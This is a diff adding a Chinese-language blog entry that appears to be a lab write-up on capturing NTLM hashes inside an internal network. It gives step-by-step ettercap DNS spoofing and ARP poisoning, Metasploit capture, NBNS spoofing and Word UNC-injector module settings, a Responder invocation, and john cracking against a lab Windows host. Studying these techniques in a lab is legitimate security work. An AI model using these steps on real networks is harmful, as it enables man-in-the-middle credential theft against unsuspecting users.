@@ -3,6 +3,21 @@
   
     
     <entry>
+      <title>NTM_HASH获取实验</title>
+      <link href="/posts/709f1946.html"/>
+      <url>/posts/709f1946.html</url>
+      <content type="html"><![CDATA[<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>当在内网没有思路的时候可以尝试hash钓鱼来获取突破口，常见的钓鱼方法有</p><ul><li>DNS劫持，嗅探获取hash</li><li>SMB伪造，嗅探获取hash</li><li>Word欺骗，获取hash</li><li>使用Responder辅助获取hash</li></ul><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><pre><code>kali:192.168.241.157 windows server 2008:192.168.241.158</code></pre><h2 id="DNS劫持嗅探获取hash"><a href="#DNS劫持嗅探获取hash" class="headerlink" title="DNS劫持嗅探获取hash"></a>DNS劫持嗅探获取hash</h2><p>ettercap配置好DNS劫持，先删除/etc/ettercap/etter.dns里面的内容，然后写入</p><pre><code>* A  192.168.241.157</code></pre><p><img src="https://s2.ax1x.com/2019/10/12/uXlrjS.png" alt="uXlrjS.png"></p><p>执行以下的操作:</p><pre><code>ettercap -G选择网卡Hosts-&gt;Scan for hosts-&gt;hosts list</code></pre><p><img src="https://s2.ax1x.com/2019/10/12/uX1k4I.png" alt=""></p><p>执行以下操作:</p><pre><code>选择192.168.241.158这个IPMitm-&gt;ARP Poisoning</code></pre><p><img src="https://s2.ax1x.com/2019/10/12/uX1KbQ.png" alt="uX1KbQ.png"></p><p><img src="https://s2.ax1x.com/2019/10/12/uX14IA.png" alt="uX14IA.png"></p><p>完事，目标机所走的流量都会转发到attack机上<br><img src="https://s2.ax1x.com/2019/10/12/uX8STH.png" alt=""></p><p>此时启动msfconsole，使用以下模块<br><img src="https://s2.ax1x.com/2019/10/12/uXGqsK.png" alt="uXGqsK.png"></p><p>之后，受害机无论访问什么网页都会弹出一个框框，要求输出凭证<br><img src="https://s2.ax1x.com/2019/10/12/uXGgMV.png" alt="uXGgMV.png"></p><p>此时用户如果输入了密码，则会抓到hash<br><img src="https://s2.ax1x.com/2019/10/12/uXJmJs.png" alt="uXJmJs.png"></p><p>使用john破解捕获到的hash<br><img src="https://s2.ax1x.com/2019/10/12/uXJbfs.png" alt="uXJbfs.png"></p><p>PS:记得msf里面设置保存的hash路径，否则不会保存文件。我这里拿别人的图（- -！）</p><h2 id="通过捕获smb流量获取hash"><a href="#通过捕获smb流量获取hash" class="headerlink" title="通过捕获smb流量获取hash"></a>通过捕获smb流量获取hash</h2><p>先用以下模块创建一个临时SMB，然后在启用抓取模块</p><pre><code>use auxiliary/server/capture/smbset srvhost 192.168.241.157set johnpwfile /root/Desktop_hashrun</code></pre><p><img src="https://s2.ax1x.com/2019/10/12/uXD13D.png" alt="uXD13D.png"></p><p>此时可以看见本地的445端口在工作<br><img src="https://s2.ax1x.com/2019/10/12/uXDYDA.png" alt="uXDYDA.png"></p><p>启动smb流量监听模块</p><pre><code>use auxiliary/nbns/nbns_responseset SPOOFIP 192.168.241.157set INTERFACE eth0run</code></pre><p><img src="https://s2.ax1x.com/2019/10/12/uXrVG8.png" alt="uXrVG8.png"></p><p>此时只要受害机访问attack的smb服务并输入用户的话将会捕获hash<br><img src="https://s2.ax1x.com/2019/10/12/uXrBIx.png" alt="uXrBIx.png"></p><p>如图<br><img src="https://s2.ax1x.com/2019/10/12/uXrsJK.png" alt="uXrsJK.png"></p><p>john破解<br><img src="https://s2.ax1x.com/2019/10/12/uXrqyQ.png" alt="uXrqyQ.png"></p><h2 id="通过Word获取hash"><a href="#通过Word获取hash" class="headerlink" title="通过Word获取hash"></a>通过Word获取hash</h2><pre><code>use auxiliary/docx/word_unc_injectorset LHOST 192.168.241.157run</code></pre><p><img src="https://s2.ax1x.com/2019/10/12/uXszBd.png" alt="uXszBd.png"></p><p>同样使用</p><pre><code>use auxiliary/server/capture/smbset srvhost 192.168.241.157set johnpwfile /root/Desktop_hashrun</code></pre><p><img src="https://s2.ax1x.com/2019/10/12/uXyRUI.png" alt="uXyRUI.png"></p><p>此时在受害机上打开word将捕获到hash<br><img src="https://s2.ax1x.com/2019/10/12/uX2rFA.png" alt="uX2rFA.png"></p><p>收到hash<br><img src="https://s2.ax1x.com/2019/10/12/uX2ROS.png" alt="uX2ROS.png"></p><h2 id="使用Responder辅助获取hash"><a href="#使用Responder辅助获取hash" class="headerlink" title="使用Responder辅助获取hash"></a>使用Responder辅助获取hash</h2><p>仓库地址：</p><pre><code>https://github.com/SpiderLabs/Responder</code></pre><p>执行</p><pre><code>python Responder.py -i 192.168.241.157 -I eth0</code></pre><p><img src="https://s2.ax1x.com/2019/10/12/uXTFdf.png" alt="uXTFdf.png"></p><p>然后在受害机访问192.168.241.157将获取hash<br><img src="https://s2.ax1x.com/2019/10/12/uXTnQs.png" alt="uXTnQs.png"></p><p>在受害者看来是一个访问错误<br><img src="https://s2.ax1x.com/2019/10/12/uXTJW4.png" alt="uXTJW4.png"></p>]]></content>
+      
+      
+        <tags>
+            
+            <tag> Writing </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
       <title>upload-master lvel 6 - level 10</title>
       <link href="/posts/1860a963.html"/>
       <url>/posts/1860a963.html</url>
